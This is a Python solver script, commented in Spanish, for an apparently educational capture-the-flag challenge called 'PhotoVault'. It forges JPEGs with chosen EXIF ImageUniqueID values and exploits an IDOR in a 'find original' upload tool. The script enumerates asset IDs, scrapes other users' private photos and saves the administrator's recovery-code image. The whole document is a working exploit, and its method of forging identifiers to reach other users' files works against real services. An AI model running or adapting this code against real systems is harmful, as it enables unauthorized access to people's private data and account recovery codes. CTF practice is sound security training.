#!/usr/bin/env python3
"""
PhotoVault (CTF AWS Student) - solver.

La herramienta "Buscar original" (/herramientas/buscar-original) identifica la copia
que uno sube leyendo el EXIF ImageUniqueID (tag 0xA420, "PV-ASSET-0000NN") y devuelve
ESE original -- sin comprobar que la foto pertenezca al usuario. Es un IDOR: forjando
el identificador se accede a fotos privadas ajenas, incluida la del administrador.

Uso:
    pip install requests piexif pillow
    python solve.py https://<instancia>.softwareseguro.com.ar/
"""
import io
import re
import sys
import base64

import requests
import piexif
from PIL import Image

BASE = sys.argv[1].rstrip("/") if len(sys.argv) > 1 else "http://localhost"
USER = "auditor_qa"
PASS = "Audit0r!2026"          # la plataforma exige >= 6 caracteres


def forge(asset_id: str) -> bytes:
    """Imagen mínima cuyo EXIF ImageUniqueID apunta al asset objetivo."""
    buf = io.BytesIO()
    Image.new("RGB", (64, 64), (0, 0, 0)).save(buf, "JPEG", quality=85)
    data = buf.getvalue()
    exif = piexif.dump({"0th": {}, "Exif": {0xA420: asset_id.encode()},
                        "1st": {}, "GPS": {}, "Interop": {}})
    out = io.BytesIO()
    piexif.insert(exif, data, out)
    return out.getvalue()


def fetch_asset(s: requests.Session, asset_id: str):
    """Devuelve (metadatos, bytes_jpeg) del original, o None si no hay match."""
    img = forge(asset_id)
    r = s.post(f"{BASE}/herramientas/buscar-original",
               files={"photo": (f"{asset_id}.jpg", img, "image/jpeg")})
    html = r.text
    if "Encontramos el original" not in html:
        return None
    meta = {k: (m.group(1) if (m := re.search(rf"<dt>{k}</dt><dd>(?:<code>)?([^<]*)", html)) else None)
            for k in ("Referencia", "Autor")}
    meta["alt"] = (m.group(1) if (m := re.search(r'alt="([^"]*)"', html)) else None)
    m = re.search(r'download="[^"]*"\s+href="data:image/jpeg;base64,([A-Za-z0-9+/=]+)"', html)
    raw = base64.b64decode(m.group(1)) if m else None
    return meta, raw


def main():
    s = requests.Session()
    # registro (idempotente: si ya existe, login)
    s.post(f"{BASE}/registro",
           data={"username": USER, "display_name": "Auditor QA", "password": PASS})
    s.post(f"{BASE}/login", data={"username": USER, "password": PASS})

    print("[*] Enumerando assets privados via IDOR en 'Buscar original'...")
    target = None
    for i in range(1, 100):
        res = fetch_asset(s, f"PV-ASSET-{i:06d}")
        if not res:
            continue
        meta, raw = res
        tag = f"  autor={meta['Autor']!r:20} alt={meta['alt']!r}"
        priv = raw is not None and (meta["Autor"] or "").startswith("Equipo PhotoVault")
        print(f"[+] {meta['Referencia']}{tag}")
        # la foto del admin: 'respaldo-codigo-recuperacion'
        if priv and meta["alt"] and "recuperacion" in meta["alt"]:
            target = (meta, raw)

    if not target:
        print("[-] No se encontró la foto objetivo.")
        return
    meta, raw = target
    open("foto-privada-admin.jpg", "wb").write(raw)
    print(f"\n[+] Foto privada del admin recuperada: {meta['Referencia']} ({meta['alt']})")
    print("[+] Guardada en foto-privada-admin.jpg -- el código está escrito en la imagen.")
    print("    ('No todo lo que viaja con una foto se ve a simple vista')")


if __name__ == "__main__":
    main()
